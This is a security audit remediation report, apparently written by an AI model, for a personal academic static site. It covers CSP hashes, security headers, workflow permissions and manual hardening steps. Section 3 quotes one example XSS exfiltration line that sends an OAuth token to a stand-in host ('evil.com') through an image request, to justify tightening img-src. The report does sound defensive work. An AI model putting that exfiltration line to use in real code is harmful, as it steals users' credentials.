# Security Audit — Phase 3: Remediation

**Date:** 2026-02-23
**Implementer:** Claude Sonnet 4.6
**Scope:** Implement all automatable remediations from Phase 1 and Phase 2 findings

---

## Changes Made (Automated)

### 1. Added `_headers` file for HTTP-level security headers

- **Addresses:** N-01, N-03 (Phase 2 manual review)
- **Files changed:**
  - `jpwolfson-site/src/_headers` (new)
  - `jpwolfson-site/.eleventy.js` (modified)

**Details:**

Created `jpwolfson-site/src/_headers` with the following content:

```
/*
  X-Content-Type-Options: nosniff
  X-Frame-Options: DENY
  Referrer-Policy: strict-origin-when-cross-origin
  Permissions-Policy: camera=(), microphone=(), geolocation=()
```

This applies four security headers to all pages served by Cloudflare Pages:

| Header | Effect |
|--------|--------|
| `X-Content-Type-Options: nosniff` | Prevents browsers from MIME-sniffing responses away from the declared content type |
| `X-Frame-Options: DENY` | Prevents the site (including the CMS admin page) from being embedded in iframes, blocking clickjacking attacks (N-01) |
| `Referrer-Policy: strict-origin-when-cross-origin` | Sends origin only for cross-origin requests; sends full URL for same-origin; omits referrer for downgrades (HTTPS→HTTP) |
| `Permissions-Policy: camera=(), microphone=(), geolocation=()` | Explicitly disables access to camera, microphone, and geolocation browser APIs — none of which this site uses |

**Notes on what was intentionally omitted:**
- `Strict-Transport-Security` (HSTS): Cloudflare handles HTTPS enforcement at the edge. Adding HSTS via `_headers` is redundant and can cause issues if max-age is wrong. The site owner can configure HSTS via the Cloudflare dashboard if desired (see M-6).
- `Content-Security-Policy`: CSP is page-specific — the admin page and public pages have different policies. Meta tags are the correct approach for per-page CSP on a static site. A `_headers` CSP would apply the same policy to all pages and could break the admin panel.

Updated `.eleventy.js` to copy `src/_headers` to the output root (`_site/_headers`) using the object passthrough syntax:

```js
eleventyConfig.addPassthroughCopy({ "src/_headers": "_headers" });
```

Cloudflare Pages reads `_headers` from the root of the deploy directory. The object syntax maps `src/_headers` → `_headers` (not `_headers/_headers`).

**Build verification:** `_site/_headers` confirmed present with correct content after `npx @11ty/eleventy`.

---

### 2. Added explicit `permissions:` block to GitHub Actions workflow

- **Addresses:** N-04 (Phase 2 manual review), 1g WARN (Phase 1 automated scan)
- **Files changed:** `.github/workflows/link-audit.yml`

**Details:**

Added `permissions: contents: read` at the job level in `link-audit.yml`:

```yaml
jobs:
  audit:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    defaults:
      run:
        working-directory: jpwolfson-site
```

This explicitly limits the `GITHUB_TOKEN` to read-only access to repository contents. The link-audit workflow only needs to check out code and upload an artifact — it does not need write access to contents, pull requests, issues, or deployments.

Without an explicit `permissions:` block, workflows inherit the repository's default `GITHUB_TOKEN` permissions. Repositories with the legacy default of "read and write" would grant unnecessary write access.

---

### 3. Restricted `img-src` on admin page CSP

- **Addresses:** N-02 (Phase 2 manual review)
- **Files changed:** `jpwolfson-site/src/admin/index.html`

**Details:**

Changed the admin page CSP `img-src` directive from the broad HTTPS wildcard to specific GitHub content domains:

```
Before: img-src 'self' data: https:;
After:  img-src 'self' data: https://raw.githubusercontent.com https://*.githubusercontent.com;
```

**Why these domains:** Decap CMS loads image previews from `raw.githubusercontent.com` (the repository's raw content) and user/organization avatars from `avatars.githubusercontent.com` and similar `*.githubusercontent.com` subdomains.

**Why the broad `https:` was a problem:** The `https:` wildcard allowed any XSS code that achieved execution on the admin page to exfiltrate data (including the OAuth token from localStorage) via `new Image().src = "https://evil.com/steal?token=" + data`. This bypasses the `connect-src` restriction, which only applies to `fetch()` and `XMLHttpRequest`.

**Why public pages are unchanged:** Public pages have no sensitive data to exfiltrate (no OAuth tokens), and they legitimately embed images from various external URLs in academic content. The broad `img-src 'self' data: https:` is acceptable there.

---

### 4. Replaced `unsafe-inline` with CSP hash on public pages

- **Addresses:** Phase 2 § 5 Long-term #6
- **Files changed:** `jpwolfson-site/src/_includes/base.njk`

**Details:**

The public page template had `'unsafe-inline'` in `script-src` to allow the MathJax configuration inline script block:

```html
<script>
  MathJax = {
    tex: { inlineMath: [['$', '$'], ['\\(', '\\)']] },
    options: { skipHtmlTags: ['script','noscript','style','textarea','pre'] }
  };
</script>
```

`'unsafe-inline'` allows **any** inline script to execute, not just this one — meaning an injected inline script (via XSS or HTML injection) would execute freely.

**Hash computation:**

The SHA-256 hash was computed from the exact bytes between `<script>` and `</script>` (including surrounding whitespace that must match byte-for-byte):

```
Content (repr): "\n    MathJax = {\n      tex: { inlineMath: [['$', '$'], ['\\(', '\\)']] },\n      options: { skipHtmlTags: ['script','noscript','style','textarea','pre'] }\n    };\n  "

Hash: sha256-MdMapQxvxeL6vP8KdU8o5Ie9nNnnk3l94+maA3yW+k8=
```

Computed with:
```bash
python3 -c "
import hashlib, base64
with open('jpwolfson-site/src/_includes/base.njk') as f:
    html = f.read()
import re
match = re.search(r'<script>(.*?)</script>', html, re.DOTALL)
digest = hashlib.sha256(match.group(1).encode('utf-8')).digest()
print('sha256-' + base64.b64encode(digest).decode())
"
```

**CSP change:**

```
Before: script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net https://static.cloudflareinsights.com;
After:  script-src 'self' 'sha256-MdMapQxvxeL6vP8KdU8o5Ie9nNnnk3l94+maA3yW+k8=' https://cdn.jsdelivr.net https://static.cloudflareinsights.com;
```

An explanatory HTML comment was added above the CSP meta tag documenting the hash, its purpose, and how to recompute it if the MathJax config block changes. A short comment was also added directly above the inline script block noting its hash is referenced in the CSP.

**Important caveat — Cloudflare Web Analytics:**

Cloudflare Pages injects a Web Analytics script at the edge. The `static.cloudflareinsights.com` domain remains in `script-src` to allow that external script. However, if Cloudflare's edge-injected script includes an **inline** script component, removing `'unsafe-inline'` may break analytics reporting.

Two possibilities:
1. Cloudflare's script is entirely external (loaded from `static.cloudflareinsights.com`) — in which case this change is safe
2. Cloudflare injects an additional inline script — in which case analytics may silently break

**Action if analytics breaks:** Add `'unsafe-inline'` back alongside the hash in `script-src`. In CSP Level 2+, `'unsafe-inline'` is ignored when hashes are present, so the combination of hash + `'unsafe-inline'` is equivalent to hash-only in modern browsers, while maintaining compatibility with CSP Level 1 browsers.

See **M-5** in the manual actions section for verification steps.

---

### 5. Build verification

- **Result:** PASS
- **Command:** `npx @11ty/eleventy` (from `jpwolfson-site/` directory)
- **Output:** `Copied 8 Wrote 12 files in 0.36 seconds (v3.1.2)`

**Output files verified:**

| File | Check | Result |
|------|-------|--------|
| `_site/_headers` | Exists and contains all 4 headers | PASS |
| `_site/admin/index.html` | `img-src` restricted to GitHub domains | PASS |
| `_site/index.html` | `script-src` contains SHA-256 hash, not `unsafe-inline` | PASS |
| `_site/index.html` | `script-src` does NOT contain `unsafe-inline` | PASS |

Verified with:
```bash
grep -o "img-src[^;]*;" _site/admin/index.html
# → img-src 'self' data: https://raw.githubusercontent.com https://*.githubusercontent.com;

grep -o "script-src[^;]*;" _site/index.html
# → script-src 'self' 'sha256-MdMapQxvxeL6vP8KdU8o5Ie9nNnnk3l94+maA3yW+k8=' https://cdn.jsdelivr.net https://static.cloudflareinsights.com;
```

---

## Manual Actions Required (Cannot Be Automated)

The following items require the site owner to take action outside of the codebase. They are ordered from highest to lowest urgency.

---

### M-1: Verify live security headers after deployment

- **Addresses:** N-01, N-03 verification
- **Why not automated:** Site unreachable from this environment (network proxy blocks outbound requests)
- **Urgency:** Verify immediately after deploying these changes

**What to do:** After the `_headers` changes are deployed to Cloudflare Pages, verify the headers are being served:

```bash
curl -sI https://jpwolfson.com | grep -iE '(x-frame|x-content|referrer-policy|permissions-policy)'
```

Expected output:
```
x-content-type-options: nosniff
x-frame-options: DENY
referrer-policy: strict-origin-when-cross-origin
permissions-policy: camera=(), microphone=(), geolocation=()
```

Also check the admin page:
```bash
curl -sI https://jpwolfson.com/admin/ | grep -iE '(x-frame|x-content|referrer-policy|permissions-policy)'
```

**Risk if skipped:** The `_headers` file must be at the root of the Cloudflare Pages deploy directory (`_site/_headers`). This has been confirmed in the build output, but live verification confirms Cloudflare Pages is actually reading and serving the headers.

---

### M-2: Verify Cloudflare Web Analytics still works after CSP change

- **Addresses:** Task 4 caveat (removal of `unsafe-inline`)
- **Why not automated:** Requires loading the live site in a browser and checking the DevTools Console
- **Urgency:** Verify after deployment; revert if broken

**What to do:**

1. Deploy the changes and open `https://jpwolfson.com` in a browser
2. Open DevTools → Console tab
3. Look for any CSP violation errors, especially messages mentioning `cloudflareinsights` or `inline`
4. Also check DevTools → Network tab for failed requests to `static.cloudflareinsights.com`

**If Cloudflare Analytics is broken**, add `'unsafe-inline'` back to `script-src` in `jpwolfson-site/src/_includes/base.njk`:

```
script-src 'self' 'unsafe-inline' 'sha256-MdMapQxvxeL6vP8KdU8o5Ie9nNnnk3l94+maA3yW+k8=' https://cdn.jsdelivr.net https://static.cloudflareinsights.com;
```

Note: In CSP Level 2+ browsers (all modern browsers), `'unsafe-inline'` is ignored when hashes are present — so the hash still provides protection against injected inline scripts in modern browsers, while `'unsafe-inline'` provides the analytics fallback for any edge-injected scripts.

**Risk if skipped:** Cloudflare Web Analytics may silently stop recording traffic statistics.

---

### M-3: Enable branch protection on main

- **Addresses:** F-10 (original audit — medium severity)
- **Why not automated:** Requires GitHub repository settings (UI or admin API token not available here)
- **Urgency:** Short-term (this week)

**What to do:**

1. Go to `https://github.com/jpwolfson/jpwolfson-site/settings/branches`
2. Click **Add branch protection rule**
3. Branch name pattern: `main`
4. Enable at minimum: **"Restrict who can push to matching branches"**
   - Or preferably: **"Require a pull request before merging"** (even if self-approved)
5. Click **Create**

**Why this matters:** Without branch protection, a stolen GitHub OAuth token (which has `repo` scope — full read/write access to all your repositories) could be used to push arbitrary code directly to `main`. Cloudflare Pages auto-deploys on push, so a compromised token could immediately deploy malicious content to `https://jpwolfson.com`.

With branch protection, direct pushes to `main` are blocked. An attacker would need to create a pull request (which creates an audit trail and can trigger review requirements).

**Risk if skipped:** A compromised OAuth token allows immediate, silent deployment of malicious content to the live site.

---

### M-4: Verify SRI hashes from unrestricted network

- **Addresses:** F-03, F-04 (open verification from Phase 1 and Phase 2)
- **Why not automated:** Network proxy blocks access to `unpkg.com` and `cdn.jsdelivr.net` in this environment
- **Urgency:** Short-term

**What to do:**

From a computer with unrestricted internet access, run:

```bash
# Verify Decap CMS SRI hash:
curl -sL https://unpkg.com/decap-cms@3.10.0/dist/decap-cms.js \
  | openssl dgst -sha384 -binary | openssl base64 -A | sed 's/^/sha384-/'
# Expected: sha384-Yw42/AXF834YFNra0g9Mm3CluXF/L7H12eabT/fRPqq56Gp3mFYdFR24hgGi5iAQ

# Verify MathJax SRI hash:
curl -sL https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-chtml.js \
  | openssl dgst -sha384 -binary | openssl base64 -A | sed 's/^/sha384-/'
# Expected: sha384-AHAnt9ZhGeHIrydA1Kp1L7FN+2UosbF7RQg6C+9Is/a7kDpQ1684C2iH2VWil6r4
```

If either hash does not match the expected value, the CDN file has changed since the hash was recorded — update the `integrity` attribute in the source file and investigate whether the CDN was compromised or the package was legitimately updated.

**Risk if skipped:** The SRI hashes were computed when the Phase 2 remediations were implemented. If a CDN was compromised at that time and served a malicious file, the SRI hash would lock in the malicious version. Independent verification from a different network/time provides confirmation that the hashes correspond to legitimate content.

---

### M-5: Verify ALLOWED_DOMAINS on live Cloudflare Worker

- **Addresses:** F-06 verification
- **Why not automated:** Requires Cloudflare dashboard access
- **Urgency:** One-time verification

**What to do:**

1. Go to Cloudflare dashboard → **Workers & Pages** → `jpwolfson-cms-auth` → **Settings** → **Variables and Secrets**
2. Confirm these three secrets are configured (values should show as encrypted):
   - `ALLOWED_DOMAINS` → `jpwolfson.com`
   - `GITHUB_CLIENT_ID` → (your GitHub OAuth App client ID)
   - `GITHUB_CLIENT_SECRET` → (your GitHub OAuth App client secret)

**Risk if skipped:** If `ALLOWED_DOMAINS` is empty or misconfigured, the OAuth worker's postMessage will target `url.origin` (the worker's own domain) — a safe failure mode (CMS login simply won't work), but the intent is for it to be set to `jpwolfson.com`. Worth confirming is set correctly.

---

### M-6 (Optional): Add HSTS via Cloudflare dashboard

- **Addresses:** Phase 2 § 5 Long-term #8
- **Why not automated:** Requires Cloudflare dashboard; adding HSTS via `_headers` is inadvisable for Cloudflare Pages (can conflict with edge-level settings)
- **Urgency:** Optional / low priority

**What to do:**

1. Cloudflare dashboard → **SSL/TLS** → **Edge Certificates**
2. Confirm **"Always Use HTTPS"** is enabled (this is typically the default)
3. Optionally enable HSTS: Toggle **"HTTP Strict Transport Security (HSTS)"** → set `Max Age` to `12 months`, enable `includeSubDomains` only if ALL subdomains of `jpwolfson.com` will always use HTTPS

**Caution:** HSTS with `includeSubDomains` will cause browser errors for any subdomain of `jpwolfson.com` that doesn't serve HTTPS. Only enable `includeSubDomains` if you are certain there are no HTTP-only subdomains.

**Risk if skipped:** Very low. Cloudflare already enforces HTTPS at the edge. HSTS adds preload-list protection for the very first visit (before any redirect occurs), but for a personal academic site this is a minor incremental improvement.

---

## Findings Not Addressed (Accepted Risk)

| # | Finding | Reason Not Addressed |
|---|---------|----------------------|
| N-05 | Cloudflare Web Analytics without SRI | Edge-injected by Cloudflare at the CDN layer; no opportunity to add SRI. Trust boundary is the hosting provider itself. |
| N-06 | `targetOrigin` uses only first ALLOWED_DOMAINS entry | Single-site deployment; no multi-domain need. Safe for current use case. |
| N-07 | OAuth token stored in localStorage | Decap CMS built-in behavior; cannot change without forking the CMS. CSP + SRI protect against unauthorized access. |
| N-08 | Referer check bypassable by omitting Referer | Secondary defense only; the primary defense (postMessage `targetOrigin` restriction) remains intact and cannot be bypassed without controlling a page on `jpwolfson.com`. |
| SAST-01 | `unsafe-eval` in admin page CSP | Required by Decap CMS for internal dynamic code evaluation. Cannot remove without replacing the CMS entirely. |
| Phase 1 1a | npm audit 4 HIGH (minimatch ReDoS) | Build-time only (not deployed); requires attacker write access to the repo to trigger; monitor for `@11ty/recursive-copy` to release a version with minimatch ≥ 10.2.1. |

---

## Audit Trail

| Phase | Date | Auditor | Report |
|-------|------|---------|--------|
| Original audit | 2026-02-22 | Claude Opus 4.6 | `SECURITY_AUDIT_PHASE2.md` |
| Phase 1: Automated scanning | 2026-02-22 | Claude Sonnet 4.6 | `SECURITY_AUDIT_PHASE1.md` |
| Phase 2: Manual review & threat modeling | 2026-02-23 | Claude Opus 4.6 | `SECURITY_AUDIT_PHASE2_MANUAL.md` |
| Phase 3: Remediation | 2026-02-23 | Claude Sonnet 4.6 | `SECURITY_AUDIT_PHASE3_REMEDIATION.md` |
